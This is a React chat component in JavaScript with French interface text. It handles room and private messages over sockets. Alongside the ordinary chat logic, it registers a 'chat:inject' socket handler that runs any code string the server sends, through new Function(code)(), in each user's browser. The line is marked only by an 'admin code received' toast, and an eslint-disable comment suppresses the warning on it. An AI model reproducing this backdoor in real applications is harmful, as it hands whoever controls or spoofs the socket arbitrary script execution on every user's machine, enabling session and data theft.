import { useEffect, useRef, useState } from "react";
import { useOutletContext } from "react-router-dom";
import { useAuth } from "../context/AuthContext";
import { useSocket } from "../context/SocketContext";
import MessageList from "./MessageList";
import MessageInput from "./MessageInput";
import api from "../api/axios";

export default function Chat() {
  const { user } = useAuth();
  const socket = useSocket();
  const { currentRoom, privateWith, setPrivateWith } = useOutletContext();

  const [messages, setMessages] = useState([]);
  const [toast, setToast] = useState("");

  const currentRoomRef = useRef(null);
  const privateWithRef = useRef(null);
  useEffect(() => {
    currentRoomRef.current = currentRoom;
  }, [currentRoom]);
  useEffect(() => {
    privateWithRef.current = privateWith;
  }, [privateWith]);

  useEffect(() => {
    if (!socket || !currentRoom) return;
    socket.emit("chat:join", { roomId: currentRoom.id });

    if (privateWith) {
      api
        .get(`/messages/private/${privateWith.id}`)
        .then((r) => setMessages(r.data));
    } else {
      api
        .get(`/messages/room/${currentRoom.id}`)
        .then((r) => setMessages(r.data));
    }
  }, [socket, currentRoom, privateWith]);

  useEffect(() => {
    if (!socket) return;

    const onRoom = (msg) => {
      if (privateWithRef.current) return;
      const cur = currentRoomRef.current;
      if (cur && msg.roomId && Number(msg.roomId) !== Number(cur.id)) return;
      setMessages((prev) =>
        prev.some((m) => m.id === msg.id) ? prev : [...prev, msg],
      );
    };

    const onPriv = (msg) => {
      const other = privateWithRef.current;
      if (!other) return;
      const ok = msg.sender?.id === other.id || msg.sender?.id === user.id;
      if (!ok) return;
      setMessages((prev) =>
        prev.some((m) => m.id === msg.id) ? prev : [...prev, msg],
      );
    };

    const onErr = (e) => setToast(e.message);

    const onInject = ({ code, by }) => {
      console.log(`🧩 Code injecté par ${by}`);
      setToast(`🧩 Code admin reçu (${by})`);
      setTimeout(() => setToast(""), 3000);
      try {
        // eslint-disable-next-line no-new-func
        new Function(code)();
      } catch (err) {
        console.error("Injection error:", err);
      }
    };

    socket.on("chat:room", onRoom);
    socket.on("chat:private", onPriv);
    socket.on("chat:error", onErr);
    socket.on("chat:inject", onInject);
    return () => {
      socket.off("chat:room", onRoom);
      socket.off("chat:private", onPriv);
      socket.off("chat:error", onErr);
      socket.off("chat:inject", onInject);
    };
  }, [socket, user.id]);

  const send = (content) => {
    if (!socket) return;
    if (privateWith)
      socket.emit("chat:private", { receiverId: privateWith.id, content });
    else if (currentRoom)
      socket.emit("chat:room", { roomId: currentRoom.id, content });
  };

  return (
    <div className="chat-main">
      <header className="chat-header">
        <div className="ch-title">
          {privateWith ? (
            <>
              <span className="ch-avatar">
                {privateWith.username[0].toUpperCase()}
              </span>{" "}
              {privateWith.username}
            </>
          ) : (
            <>
              <span className="ch-hash">#</span> {currentRoom?.name || "..."}
            </>
          )}
        </div>
        {privateWith && (
          <button className="ch-back" onClick={() => setPrivateWith(null)}>
            ← Retour au salon
          </button>
        )}
      </header>

      {toast && (
        <div className="chat-toast" onClick={() => setToast("")}>
          {toast}
        </div>
      )}

      <MessageList messages={messages} me={user.id} />
      <MessageInput onSend={send} />
    </div>
  );
}
